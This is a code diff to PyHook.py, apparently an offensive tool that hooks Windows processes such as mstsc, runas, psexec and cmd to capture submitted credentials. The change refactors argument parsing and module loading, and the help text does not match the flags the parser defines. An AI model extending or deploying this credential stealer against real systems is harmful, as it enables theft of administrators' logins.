@@ -4,6 +4,8 @@
 
 
 from __future__ import print_function
+
+import importlib
 from argparse import ArgumentParser, RawTextHelpFormatter
 from multiprocessing.pool import ThreadPool
 from typing import List
@@ -11,24 +13,46 @@ from time import sleep
 import psutil
 import re
 
+
 example_text = '''example:
 
- python PyHook.py -p mstsc - Hook into mstsc
- python PyHook.py -p mstsc, cmd - Hook into mstsc and cmd
- python PyHook.py -p all - Hook all available processes
- 
-available processes:
+python PyHook.py [-cmxrep]
 
- mstsc
- cmd
- mobaxterm
- runas
- explorer
- psexec'''
+-c, --cmd          enable cmd hook.
+-m, --mstsc        enable mstsc hook.
+-x, --xterm        enable mobaxterm hook.
+-r, --runas        enable runas hook.
+-e, --explorer     enable explorer hook.
+-p, --psexec       enable psexec hook.
 
-parser = ArgumentParser(epilog=example_text, formatter_class=RawTextHelpFormatter)
-parser.add_argument('-p', '--process', help='desired process to hook', nargs='+', required=True)
-args = parser.parse_args()
+No flags           enable all hooks'''
+
+
+def parse_args():
+    parser = ArgumentParser(epilog=example_text, formatter_class=RawTextHelpFormatter)
+    parser.add_argument('-c', '--cmd', action='store_true')
+    parser.add_argument('-r', '--rdp', action='store_true')
+    parser.add_argument('-x', '--mobaxterm', action='store_true')
+    parser.add_argument('-ru', '--runas', action='store_true')
+    parser.add_argument('-e', '--explorer', action='store_true')
+    parser.add_argument('-p', '--psexec', action='store_true')
+    args = vars(parser.parse_args())
+    if not any(args.values()):
+        for module in args.keys():
+            args[module] = True
+    return args
+
+
+def get_selected_hooks():
+    modules = []
+    for hook_process_name, hook_enabled in parse_args().items():
+        if hook_enabled:
+            try:
+                hook_module = importlib.import_module(f"hooks.{hook_process_name}")
+                modules.append(hook_module.wait_for)
+            except ModuleNotFoundError:
+                print(f"[-] A module for the selected process is not available - {hook_process_name}")
+    return modules
 
 
 def get_process_by_list_names(name_list: List[str]) -> List[psutil.Process]:
@@ -81,34 +105,7 @@ def on_credential_submit(message, data):
 
 
 def main():
-    from hooks import rdp, psexec, explorer, cmd, mobaxterm, runas
-    functions = []
-    for process in args.process:
-        if process == "psexec":
-            print("[+] Waiting for psexec")
-            functions.append(psexec.wait_for)
-        elif process == "cmd":
-            print("[+] Waiting for cmd")
-            functions.append(cmd.wait_for)
-        elif process == "mobaxterm":
-            print("[+] Waiting for mobaxterm")
-            functions.append(mobaxterm.wait_for)
-        elif process == "runas":
-            print("[+] Waiting for runas")
-            functions.append(runas.wait_for)
-        elif process == "explorer":
-            print("[+] Waiting for explorer")
-            functions.append(explorer.wait_for)
-        elif process == "mstsc":
-            print("[+] Waiting for mstsc")
-            functions.append(rdp.wait_for)
-        elif process == "all":
-            functions.extend((psexec.wait_for, rdp.wait_for, explorer.wait_for, cmd.wait_for, mobaxterm.wait_for,
-                              runas.wait_for))
-        else:
-            print("[-] The process is not available")
-            exit(1)
-
+    functions = get_selected_hooks()
     run_thread_pool_for_functions(functions)
 
 
